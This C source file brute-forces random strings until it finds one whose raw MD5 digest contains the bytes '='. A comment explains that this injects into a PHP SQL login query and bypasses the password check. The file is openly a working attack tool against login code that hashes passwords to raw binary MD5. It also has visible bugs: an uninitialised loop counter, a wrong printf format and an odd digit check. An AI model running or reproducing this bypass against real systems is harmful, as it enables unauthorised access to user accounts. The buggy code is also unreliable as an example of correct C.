/*

The goal of this program is to find any hash that contains "'='"
In PHP this will be the equivalent of:
SELECT * FROM users WHERE username=’$username’ and pw=''='XXXXX'"

As long as XXXXX does not begin with an integer then this evaluates to
0=0 which is true. Giving us access to the password.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/md5.h>

int main(){

	int 	r1, r2, r3, r4, i, x;
	char	test_string[100];
	unsigned char 	md5_digest[MD5_DIGEST_LENGTH];
	char	hashed_string[33];
	char	*found;

	while(1){
		i++;
		if(i%1000000 == 0){
			 printf("trying %d million strings\n", i/1000000);
			 // printf("last test: %s\n", md5_digest);
		}

		r1 = rand();
		r2 = rand();
		r3 = rand();
		r4 = rand();

		sprintf(test_string, "%d%d%d%d", r1, r2, r3, r4);

		MD5((unsigned char*)&test_string, strlen(test_string), (unsigned char*)&md5_digest);

		// for(x=0; x<16; x++){
		// 	sprintf(&hashed_string[x*2], "%02x", (unsigned int)md5_digest[x]);
		// }

		found = strstr(md5_digest, "'='");

		if(found != NULL){

			printf("substring found %s\n", test_string);
			printf("hash: %c\n", md5_digest);
			if(found[3] <= '0' || found[3] > '9'){
				printf("password: %s\n", test_string);
				exit(0);
			}
		}

	}

}